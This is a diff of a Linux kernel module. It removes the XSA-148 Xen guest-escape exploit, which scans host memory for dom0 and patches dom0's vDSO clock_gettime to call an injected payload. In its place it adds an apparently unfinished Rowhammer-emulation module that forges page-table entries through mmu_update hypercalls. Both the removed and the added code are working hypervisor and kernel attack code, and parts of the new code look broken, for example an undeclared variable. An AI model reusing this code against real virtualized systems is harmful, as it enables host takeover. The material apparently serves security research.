@@ -1,12 +1,22 @@
+/* Linux Kernel Includes */
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/gfp.h>
-#include <linux/sched.h>
+#include <linux/delay.h>
 #include <linux/slab.h>
-#include <asm/xen/hypercall.h>
-#include <asm/xen/page.h>
+#include <linux/sched.h>
+#include <linux/gfp.h>
+#include <linux/mm.h>
+#include <linux/highmem.h>
 
-#include "payload.h"
+/* Xen  Includes */
+/* Xen header files */
+#include <asm/xen/page.h>
+#include <asm/xen/hypervisor.h>
+#include <asm/xen/hypercall.h>
+#include <xen/interface/event_channel.h>
+#include <xen/xen.h>
+#include <xen/interface/xen.h>
+#include <asm/xen/interface.h>
 
 #define MAX_MFN 0x7FFFFF
 #define PMD_FLAG (_PAGE_RW | _PAGE_USER | _PAGE_ACCESSED | _PAGE_DIRTY | _PAGE_PRESENT)
@@ -25,8 +35,11 @@
 #define DO_PAGE_READ 1
 #define DO_PAGE_WRITE 2
 
+#define STEP(_f, _a...) \
+	printk("\n# --- STEP:" _f "\n\n",  ## _a);
+
 #define DEBUG(_f, _a...) \
-	printk("xen_exploit:%d - " _f "\n", __LINE__, ## _a);
+	printk("RowHammer: %d - " _f "\n", __LINE__, ## _a);
 
 #define __mfn(_v) ((unsigned long) (arbitrary_virt_to_machine(_v).maddr >> PAGE_SHIFT))
 #define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)
@@ -36,6 +49,11 @@
 	HYPERVISOR_mmuext_op(uops, 1, NULL, DOMID_SELF); }
 
 static void* l2_entry_va;
+
+/* This variable will hold a copy of the PT of the va */
+static unsigned long shadow_va_page;
+static unsigned int my_var = 18012016;
+static unsigned long va = (unsigned long) &my_var;
 
 void page_walk(unsigned long va)
 {
@@ -53,6 +71,7 @@ void page_walk(unsigned long va)
 	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
 	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
 	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
+    printk("value (%p - 0x%lx) val= 0x%lx, offset =0x%lx\n",(void*) va, __machine_addr((void *)va), *(unsigned long*)va, va & ~PAGE_MASK);
 }
 
 pgd_t *get_pgd(unsigned long va)
@@ -76,6 +95,11 @@ pte_t *get_pte(unsigned long va)
 	return pte_offset_kernel(get_pmd(va), va);
 }
 
+/*
+ * Check
+ * http://xenbits.xen.org/docs/4.13-testing/hypercall/x86_64/include,public,xen.h.html#Func_HYPERVISOR_mmu_update
+ *
+ */
 int mmu_update(unsigned long ptr, unsigned long val)
 {
 	struct mmu_update mmu_updates;
@@ -87,6 +111,22 @@ int mmu_update(unsigned long ptr, unsigned long val)
 	HYPERVISOR_tlb_flush_all();
 
 	return rc;
+}
+
+
+int make_page_ro(unsigned long p)
+{
+    int rc;
+	pte_t *pte_aligned = get_pte(p);
+
+	// removes RW bit on the aligned_mfn_va's pte
+	rc = mmu_update(__machine_addr(pte_aligned) | MMU_NORMAL_PT_UPDATE, pte_aligned->pte & ~_PAGE_RW);
+	if(rc < 0)
+	{
+		printk("cannot unset RW flag on PTE (0x%lx)\n", p);
+		return -1;
+	}
+    return 0;
 }
 
 int startup_dump(unsigned long l2_entry_va, unsigned long aligned_mfn_va)
@@ -117,7 +157,7 @@ int startup_dump(unsigned long l2_entry_va, unsigned long aligned_mfn_va)
 int set_l2_pse_flag(unsigned long va)
 {
 	pmd_t *pmd = get_pmd(va);
-	int rc;
+ 	int rc;
 
 	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, pmd->pmd | _PAGE_PSE);
 	if(rc < 0)
@@ -215,7 +255,9 @@ int is_startup_info_page(char *page_data)
 
 	return ret;
 }
-
+/*
+ * https://man7.org/linux/man-pages/man7/vdso.7.html
+ */
 int is_vdso_page(char *page_data)
 {
 	char elf_header[] = "\x7f\x45\x4c\x46\x02\x01\x01\x00";
@@ -231,33 +273,6 @@ int is_vdso_page(char *page_data)
 	return ret;
 }
 
-void patch_vdso(unsigned long vdso_mfn)
-{
-	char *vdso_data = kmalloc(PAGE_SIZE*2, GFP_KERNEL);
-	unsigned long entry_point;
-	unsigned int value;
-	unsigned long clock_gettime_offset;
-
-	dump_page_buff(vdso_mfn, vdso_data);
-	dump_page_buff(vdso_mfn+1, vdso_data+PAGE_SIZE);
-
-	/* e_entry */
-	entry_point = *(unsigned long*) (vdso_data + 0x18);
-	clock_gettime_offset = entry_point & 0xfff;
-
-	/* put payload at the end of vdso */
-	memcpy(vdso_data+PAGE_SIZE*2-payload_o_len, payload_o, payload_o_len);
-
-	//  hijack clock_gettime
-	value = PAGE_SIZE*2 - payload_o_len - clock_gettime_offset;
-	vdso_data[clock_gettime_offset] = '\x90'; // nop
-	vdso_data[clock_gettime_offset+1] = '\xe8'; // call
-	*(unsigned int*)(vdso_data+clock_gettime_offset+2) = value - 6;
-
-	// write modified vdso
-	write_page_buff(vdso_mfn, vdso_data);
-	write_page_buff(vdso_mfn+1, vdso_data+PAGE_SIZE);
-}
 
 
 int find_in_pte(pte_t *pte_base, int what)
@@ -420,92 +435,244 @@ int find_vdso_into_L4(unsigned long pgd_mfn, pgd_t * pgd)
 	return find_in_pgd(pgd, FIND_VDSO_PAGE);
 }
 
-static int __init xen_exploit_init(void)
-{
-	int xen_version = HYPERVISOR_xen_version(0, NULL);
-	void* aligned_mfn_va;
-	char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
-	unsigned long *current_tab = (unsigned long*) buff;
-	struct start_info *start_f = (struct start_info *) buff;
-	unsigned long page;
-    /*  
-     *  task_struct get_current => current 
-     *  This is a pointer to the current process (which called the process) 
+
+struct shared_info dummy_shared_info;
+struct shared_info *HYPERVISOR_shared_info = (void *)&dummy_shared_info;
+
+void map_shared_info(void){
+    if (!xen_feature(XENFEAT_auto_translated_physmap)) {
+        printk("XENFEAT_auto_translated_physmap not enabled\n");
+        set_fixmap(FIX_PARAVIRT_BOOTMAP, xen_start_info->shared_info);
+        HYPERVISOR_shared_info = (struct shared_info *)fix_to_virt(FIX_PARAVIRT_BOOTMAP);
+    } else{
+        HYPERVISOR_shared_info = (struct shared_info *)__va(xen_start_info->shared_info);
+    }
+
+    if(HYPERVISOR_shared_info == &dummy_shared_info){
+        printk(KERN_ALERT "shared_info not mapped.\n");
+    }
+
+    printk("shared_info address %p\n", &HYPERVISOR_shared_info);
+}
+
+
+void print_kmemory_info(void * ret){
+    printk("Address of ret \t\t\t%p\n", &ret);
+        /* 
+     * __va is used only for converting virtuall memory on kernel 
+     * every address is always virtual, we need to stablish the physicall address
+     * __pa will get the physiscal address of this SO 
+     * BUT, we are on a virtualized system
      */
-	unsigned long *my_pgd = (unsigned long*) (current->mm->pgd);
-	int tmp;
+    printk("Address of __pa(ret) \t\t%p\n",(void *) __pa(&ret));
+    printk("Address of virt_to_phys(ret) \t\t%p\n",(void*) virt_to_phys(&ret));
+    printk("virt_addr_valid(ret) \t%d\n", virt_addr_valid(&ret));
+    printk("Address of virt_to_page(ret) \t%p\n", virt_to_page(&ret));
+    printk("\n\n");
+}
 
-	DEBUG("xen_version = %d.%d", (xen_version >> 16) & 0xFFFF, xen_version & 0xFFFF);
 
-	// get an aligned mfn
-    // get free pages 9 -> blocks of 2^9 pages = 2^9 x 2^12 = 2MB
-	aligned_mfn_va = (void*) __get_free_pages(__GFP_ZERO, 9);
-	DEBUG("aligned_mfn_va = %p", aligned_mfn_va);
-	DEBUG("aligned_mfn_va mfn = 0x%lx", __machine_addr(aligned_mfn_va));
-	page_walk((unsigned long) aligned_mfn_va);
+/* Set the pte_t that has the same offset that va to the new value */
+void update_va_pte_in_shadow(unsigned long shadow_va_page, unsigned long va, pte_t *npte)
+{
+    unsigned long offset = va & ~PAGE_MASK;
+    DEBUG("Page offset from va: %p, 0x%lx", (void *) va, offset);
+    pte_t *ptr = (pte_t *) shadow_va_page;
+    DEBUG("Previous pte 0x%lx\n", ptr[pte_index(va)].pte);
+    ptr[pte_index(va)] = *npte;
+    DEBUG("New  pte 0x%lx\n", ptr[pte_index(va)].pte);
+}
 
-	// get a 2Mb virtual memory
-	l2_entry_va = (void*) __get_free_pages(__GFP_ZERO, 9);
-	DEBUG("l2_entry_va = %p", l2_entry_va);
-	DEBUG("l2_entry_va mfn = 0x%lx", __machine_addr(l2_entry_va));
-	page_walk((unsigned long) l2_entry_va);
+unsigned int * value_from_shadow(unsigned long shadow_va_page, unsigned long va)
+{
+    unsigned long offset = va & ~PAGE_MASK;
+    DEBUG("Page offset from va: %p, 0x%lx", (void *) va, offset);
+    pte_t *ptr = (pte_t *) shadow_va_page;
+    //unsigned int *page = (unsigned int *) ptr[pte_index(va)].pte;
+    struct page *page = pte_page(ptr[pte_index(va)]);
+    get_page(page);
+    unsigned int *p = (unsigned int*) kmap(page);
+    DEBUG("Address returned from the page %p",(void*) p);
+    //todo: unmap this page
 
-	if(startup_dump((unsigned long) l2_entry_va, (unsigned long) aligned_mfn_va))
+    return &p[offset];
+}
+
+unsigned int get_value_from_shadow(unsigned long shadow_va_page, unsigned long va)
+{
+    unsigned int *v;
+    v = value_from_shadow(shadow_va_page, va);
+    return *v;
+}
+
+void set_value_from_shadow(unsigned long shadow_va_page, unsigned long va, int val)
+{
+    unsigned int *v;
+    v = value_from_shadow(shadow_va_page, va);
+    *v = val;
+}
+
+void copy_val1_to_shadow(unsigned long shadow_va_page)
+{
+    DEBUG("va - pmd_t (pte_t page frame) - %p - 0x%lx",get_pmd(va), 
+            __machine_addr((void*)get_pmd(va)));
+    DEBUG("va - pte    0x%lx ",(unsigned long) get_pmd(va));
+    DEBUG("va - pte va 0x%lx ",pmd_page_vaddr(*get_pmd(va)));
+    DEBUG("va - pte[0]  0x%lx ",get_pmd(va)->pmd);
+    DEBUG("va - pte_t index - 0x%lx", pte_index(va));
+
+	memcpy((void*)shadow_va_page, (void*)pmd_page_vaddr(*get_pmd(va)), PAGE_SIZE);
+
+    pte_t *ptr = (pte_t *) shadow_va_page;
+    DEBUG("value in shadow_va_page 0x%lx", *(unsigned long*)shadow_va_page);
+    DEBUG("va -pte_idx(0x%lx) : (addr[pte_idx]) %p -(addr[pte_idx].pte) 0x%lx\n",pte_index(va), 
+            &ptr[pte_index(va)], ptr[pte_index(va)].pte);
+
+    page_walk(shadow_va_page);
+
+    /*
+    DEBUG("my_var %d",my_var);
+    my_var = 30071980;
+    DEBUG("my_var %d",my_var);
+    DEBUG("Print va value from shadow_va_page: %d ", get_value_from_shadow(shadow_va_page, va));
+    int new_val = 23071987;
+    DEBUG("Print va value from shadow_va_page: %d ", new_val);
+    set_value_from_shadow(shadow_va_page, va, 23071987);
+    DEBUG("my_var %d",my_var);
+    */
+}
+    
+
+int replace_l1(unsigned long va, unsigned long l1_page)
+{
+	pte_t *pte_aligned = get_pte(va);
+	pmd_t *pmd = get_pmd(l2_entry_va);
+	int rc;
+
+    /* reestart from here adapt the function from the mapping step */
+
+	// removes RW bit on the aligned_mfn_va's pte
+	rc = mmu_update(__machine_addr(pte_aligned) | MMU_NORMAL_PT_UPDATE, pte_aligned->pte & ~_PAGE_RW);
+	if(rc < 0)
 	{
-		DEBUG("unable to map PMD.");
+		printk("cannot unset RW flag on PTE (0x%lx)\n", aligned_mfn_va);
 		return -1;
 	}
 
-	DEBUG("startup_dump ok");
-	page_walk((unsigned long) l2_entry_va);
-
-	for(page=0; page<MAX_MFN; page++)
+	// map.
+	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, (__mfn((void*) aligned_mfn_va) << PAGE_SHIFT) | PMD_FLAG);
+	if(rc < 0)
 	{
-		dump_page_buff(page, buff);
-		if(current_tab[261] == my_pgd[261] &&
-		   current_tab[262] == my_pgd[262] &&
-		   current_tab[511] != 0 &&
-		   current_tab[510] != 0 &&
-		   __mfn(my_pgd) != page)
-		{
-			tmp = find_start_info_into_L4(page, (pgd_t*) buff);
-			if(tmp != 0)
-			{
-				// we find a valid start_info page
-				DEBUG("start_info page : 0x%x", tmp);
-				dump_page_buff(tmp, buff);
-
-				if(start_f->flags & SIF_INITDOMAIN)
-				{
-					DEBUG("dom0!");
-					dump_page_buff(page, buff);
-					tmp = find_vdso_into_L4(page, (pgd_t*) buff);
-
-					if(tmp != 0)
-					{
-						DEBUG("dom0 vdso : 0x%x", tmp);
-						patch_vdso(tmp);
-						DEBUG("patch.");
-						break;
-					}
-				} else {
-					DEBUG("not dom0");
-				}
-			}
-		}
+		printk("cannot update L2 entry 0x%lx\n", l2_entry_va);
+		return -1;
 	}
 
 	return 0;
 }
 
-static void __exit xen_exploit_exit(void)
-{
-	printk("goodbye!\n");
+
+static int __init rh_emul_init(void) {
+
+    printk("Loading the rh_emul : %s\n",__FUNCTION__);
+
+	char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
+    //unsigned long *current_tab = (unsigned long*) buff;
+	//struct start_info *start_f = (struct start_info *) buff;
+
+    /*  
+     *  task_struct get_current => current 
+     *  This is a pointer to the current process (which called the process) 
+     */
+	unsigned long *my_pgd = (unsigned long*) (current->mm->pgd);
+
+    DEBUG("pgd addres %p", my_pgd);
+    DEBUG("PAGE_SHIFT %d", PAGE_SHIFT);
+    DEBUG("PAGE_OFFSET \t%lX", PAGE_OFFSET);
+    DEBUG("PAGE_SIZE %lx", PAGE_SIZE);
+    DEBUG("PAGE_MASK %lx", PAGE_MASK);
+    DEBUG("Page Walk of va %d - %p", *(int *)va, (void *) va);
+    page_walk((unsigned long) va);
+
+    /*
+     *
+     *
+     */
+    STEP("1: Allocate a shadow page");
+	// get an aligned mfn writeable
+	shadow_va_page =  __get_free_page(__GFP_ZERO);
+	DEBUG("shadow_va_page = 0x%lx", shadow_va_page);
+	DEBUG("shadow_va_page mfn = 0x%lx", __machine_addr((void *)shadow_va_page));
+    page_walk(shadow_va_page);
+
+    STEP("2: copy the L1 from va to the shadow_va_page");
+    copy_val1_to_shadow(shadow_va_page);
+
+    STEP("3: Forge the row hammer Flip bit replacing the page");
+    replace_l1(va, shadow_va_page);
+
+
+
+    STEP("4: create fake pte_t in the the L1 shadow_va_page");
+    pte_t fake_pte;
+    fake_pte.pte = 0x54f536298;
+    update_va_pte_in_shadow(shadow_va_page, va, &fake_pte);
+
+
+
+
+
+/*
+    for(i=0; i < 512; i++){
+        printk("%d : %p, 0x%lx",i,ptr, ptr->pte);
+        ptr++;
+        (i%3) == 2 ? printk("\n") : printk(" |");
+    }
+    printk("\n");
+    pte_t *from = (pte_t *) get_pmd(va);
+    pte_t *to = (pte_t *) shadow_va_page;
+
+    for(i=0; i < 8; i++){
+        to = from++;
+        to++;
+        printk("%d : %p",i,to);
+        (i%4) == 3 ? printk("\n") : printk(" |");
+    }
+    ptr = (pte_t*) get_pmd(va);
+
+    DEBUG("value in get_pmd(va) 0x%lx\n", get_pmd(va)->pmd);
+    for(i=0; i < 512; i++){
+        printk("%d : %p, 0x%lx",i,ptr, ptr->pte);
+        ptr++;
+        (i%3) == 2 ? printk("\n") : printk(" |");
+    }
+    printk("\n");
+
+    for(i=0; i < (PAGE_SIZE/sizeof(pte_t)); i++){
+        printk("%d : %p, 0x%lx",i,ptr,ptr->pte);
+        ptr++;
+        (i%4) == 3 ? printk("\n") : printk(" |");
+
+    }
+    */
+
+    struct page a;
+    
+
+	return 0;
 }
 
-module_init(xen_exploit_init);
-module_exit(xen_exploit_exit);
+
+static void __exit rh_emul_exit(void) {
+
+    free_page(shadow_va_page);
+    printk(KERN_INFO "Exiting rh_emul  module\n");
+
+}
+
+module_init(rh_emul_init);
+module_exit(rh_emul_exit);
+
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Jérémie Boutoille - Quarkslab");
-MODULE_DESCRIPTION("XSA-148 exploit");
+MODULE_AUTHOR("Charles F.'. Goncalves");
+
